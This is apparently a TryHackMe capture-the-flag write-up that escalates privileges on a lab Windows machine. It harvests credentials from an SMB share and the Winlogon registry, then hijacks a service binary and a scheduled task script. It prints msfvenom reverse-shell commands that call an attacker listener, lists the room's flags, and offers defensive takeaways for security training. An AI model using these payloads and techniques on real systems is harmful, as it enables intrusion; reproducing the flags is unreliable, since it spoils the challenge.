# TryHackMe — Windows Jump

**Platform:** [TryHackMe](https://tryhackme.com/room/windowsjump)
**Difficulty:** Medium
**Category:** Privilege Escalation
**Time to Complete:** ~60 minutes
**Tools Used:** Nmap, smbclient, xfreerdp, reg query, sc, icacls, msfvenom, winPEAS, Netcat

---

## The Scene

A routine vulnerability scan flagged a Windows workstation on the internal network — nothing alarming on the surface, just a machine left behind after a round of layoffs that IT never properly decommissioned. The objective is to find out how badly.

The escalation chain is clearly defined: `guest → thmuser → notadmin → svcadmin → SYSTEM`. Four privilege levels, four flags, each requiring a different technique to advance. The room is structured as a progressive difficulty curve, which shaped the approach taken at each stage — start with the lowest hanging fruit, since it barely costs anything to check and has an embarrassingly high success rate in practice.

---

## Reconnaissance

With only an IP address to start from, the first step was mapping the attack surface:

```bash
nmap -sC -sV -p- 10.49.161.8
```

The scan returned a fairly standard Windows workstation profile: SMB on 445, RDP on 3389, WinRM on 5985, and a cluster of high-numbered RPC ports. The hostname came back as `PRIVESC` — which is either the room being helpful or an administrator with a sense of humour. The two ports worth focusing on immediately were 445 (the path in) and 3389 (the path to a proper interactive session once credentials materialise).

---

## Stage 1 — Guest to thmuser: SMB Share Enumeration

SMB on 445 with no known credentials means trying anonymous and guest access first. A guest login enumerated the available shares:

```bash
smbclient -L 10.49.161.8 -U 'guest%'
```

Four shares returned: `ADMIN$`, `C$`, `IPC$` and `Public`. The first three are standard administrative shares that typically require elevated credentials. `Public`, described as a public file share, was the obvious place to look.

```bash
smbclient //10.49.161.8/Public -U 'guest%' -c 'ls'
```

A single file: `welcome.txt`. Downloaded and read locally:

```bash
smbclient //10.49.161.8/Public -U 'guest%' -c 'get welcome.txt'
cat welcome.txt
```

The file contained default credentials for new employees — username `thmuser`, password `Password1!` — alongside a reminder to change the password after first login (a reminder that, going by the challenge, was not followed).

It is worth pausing here on methodology. The instinct when facing a privilege escalation challenge is often to reach immediately for technical tools, since that feels more like "real" pentesting. Default credentials in a public file share are so obviously misconfigured that they can feel too easy to count. They are not — they are exactly the kind of finding that appears in real internal network assessments with a concerningly high frequency, and checking for them first costs almost nothing.

An `xfreerdp` session with the recovered credentials produced a full Windows GUI. Navigating to `C:\Users\thmuser\Desktop` via the file manager:

**Flag 1: `THM{5mb_cr3d5_1n_th3_5h4r3}`**

---

## Stage 2 — thmuser to notadmin: Winlogon Registry Credentials

With a foothold as `thmuser`, the natural first sweep was the Windows registry's autologon entries. When a machine is configured for automatic login, the credentials required to do so are stored in plaintext under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` — a well-known location that is, perhaps surprisingly, still populated on real machines with some regularity.

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
```

```
DefaultUserName    REG_SZ    notadmin
```

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

```
DefaultPassword    REG_SZ    P@ssw0rd!
```

Both credentials sitting in plaintext in the registry. `runas` with the `/savecred` flag launched a new command prompt in the `notadmin` context:

```
runas /savecred /user:notadmin cmd.exe
```

Navigating to `notadmin`'s desktop:

**Flag 2: `THM{w1nl0g0n_cr3ds_3xp0s3d}`**

---

## Stage 3 — notadmin to svcadmin: Weak Service Binary Permissions

The file system sweep of `notadmin`'s environment did not surface anything immediately useful, which was the expected progression — the easy paths were already behind us. The investigation shifted to running services, looking for anything that runs under a more privileged account and whose binary or containing directory `notadmin` could modify.

`sc qc THMSvc` revealed a service named `THM Background Service` running as `.\svcadmin` from `C:\Windows\THMSVC\svc.exe`. The service account was the target. The question was whether the path to the binary was controllable:

```
icacls C:\Windows\THMSVC
```

```
C:\Windows\THMSVC PRIVESC\notadmin:(OI)(CI)(F)
```

`notadmin` had Full Control over the directory containing the service executable. This is a weak service binary permission vulnerability — control of the directory allows replacing the executable entirely, since Windows resolves the binary path at service start time rather than validating the file at rest. The service's DACL also permitted standard users to start and stop it, which meant the replacement could be triggered on demand rather than waiting for a system event.

A service-compatible reverse shell was generated and staged via the Public share, then swapped in for the original binary (keeping a backup, since overwriting a service executable with a shell that exits immediately can wedge the service in an unrecoverable state for the duration of the session):

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.49.67.31 LPORT=4446 -f exe-service -o svc.exe
```

```
copy C:\Windows\THMSVC\svc.exe C:\Windows\THMSVC\svc.exe.bak
copy C:\Users\Public\svc.exe   C:\Windows\THMSVC\svc.exe
sc stop THMSvc & sc start THMSvc
```

The listener on 4446 caught the shell running as `svcadmin`:

**Flag 3: `THM{s3rv1c3_b1n4ry_h1j4ck3d}`**

---

## Stage 4 — svcadmin to SYSTEM: Scheduled Task Script Hijack

`svcadmin` had no administrative group membership and no `SeImpersonatePrivilege`, which ruled out the potato family of attacks. A manual sweep of the usual escalation surfaces (service binaries, PATH directories, startup locations) did not surface anything obvious, so winPEAS was uploaded and run to cast a wider net.

winPEAS flagged something the manual sweep had missed: a batch file under `C:\Windows\Tasks\cleanup.bat`. The file content was unremarkable on its own — a basic temporary file deletion script — but the permission on it was not:

```
icacls C:\Windows\Tasks\cleanup.bat
```

```
C:\Windows\Tasks\cleanup.bat PRIVESC\svcadmin:(I)(M)
```

`svcadmin` had Modify access on a script that a scheduled task ran as SYSTEM. The task definition itself did not need to be touched; control of the script it called was sufficient. A second payload was generated, staged to the Public share and written into `cleanup.bat`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.49.67.31 LPORT=4447 -f exe -o p4.exe
```

```bat
echo @echo off > C:\Windows\Tasks\cleanup.bat
echo C:\Users\Public\p4.exe >> C:\Windows\Tasks\cleanup.bat
```

When the scheduled task next fired, the script ran `p4.exe` in the SYSTEM context. The listener on 4447 received the shell:

```
whoami
nt authority\system
```

`flag4.txt` at the root of `C:\`:

**Flag 4: `THM{t4sk_wr1t3_t0_SYST3M}`**

---

## The Full Escalation Chain

| Stage | Technique | Vulnerability |
|-------|-----------|---------------|
| guest → thmuser | SMB share enumeration; `welcome.txt` read | Credentials stored in a world-readable file share |
| thmuser → notadmin | Registry query for Winlogon autologon entries | Plaintext credentials in `DefaultPassword` registry value |
| notadmin → svcadmin | Service binary replacement via directory Full Control | `notadmin` had `(OI)(CI)(F)` on `C:\Windows\THMSVC\` |
| svcadmin → SYSTEM | Scheduled task script hijack via Modify permission | `svcadmin` had `(M)` on `C:\Windows\Tasks\cleanup.bat` |

---

## Key Takeaways

**Always check for plaintext credentials before reaching for an exploit.** The first two stages of this chain were solved by reading a text file and querying two registry keys respectively. Both took under two minutes combined. In a real engagement, that time investment against the probability of success makes plaintext credential hunting the correct first move on any new system, regardless of how sophisticated the rest of the engagement ends up being.

**Directory permissions matter as much as file permissions.** Stage 3 was not about the permissions on `svc.exe` itself — it was about the permissions on the directory containing it. `notadmin` could not modify the original service binary directly, but Full Control of the parent directory allowed replacing it entirely. `icacls` checks against both the file and its containing directory are worth running as a matter of habit.

**winPEAS earns its place when manual enumeration stalls.** The scheduled task in Stage 4 was missed by a manual sweep of the usual escalation locations. winPEAS found it. Automated enumeration tools are not a replacement for understanding what you are looking for, but they cast a wider net across less-obvious paths (Tasks, AlwaysInstallElevated, DLL hijack candidates) that manual inspection tends to under-cover.

**Back up service binaries before overwriting them.** `svc.exe.bak` was created before the replacement in Stage 3. A service executable overwritten with a reverse shell that exits on connection will leave the service in a failed state, which can cause noise on a monitored network and makes the box harder to work with for the remainder of the session. The backup costs one command and preserves the ability to restore the original state.

**Scheduled task hijacking is a reliable SYSTEM escalation path when `SeImpersonate` is absent.** Potato attacks (PrintSpoofer, GodPotato and their variants) get significant coverage in privilege escalation training because they work well when `SeImpersonatePrivilege` is available. When it is not, scheduled task scripts with permissive ACLs are one of the more consistent alternatives, particularly on older or less-hardened Windows configurations.

---

## Flags Summary

| Flag | Location | Technique |
|------|----------|-----------|
| Flag 1 | `C:\Users\thmuser\Desktop\flag1.txt` | SMB public share credential disclosure |
| Flag 2 | `C:\Users\notadmin\Desktop\flag2.txt` | Winlogon registry plaintext credentials |
| Flag 3 | `C:\Users\svcadmin\Desktop\flag3.txt` | Weak service directory permissions |
| Flag 4 | `C:\flag4.txt` | Scheduled task script hijack |

---

*Writeup by Samarth Badola — [TryHackMe Profile](https://tryhackme.com/p/samarthbadola)*
*Room: [Windows Jump](https://tryhackme.com/room/windowsjump) (Premium)*
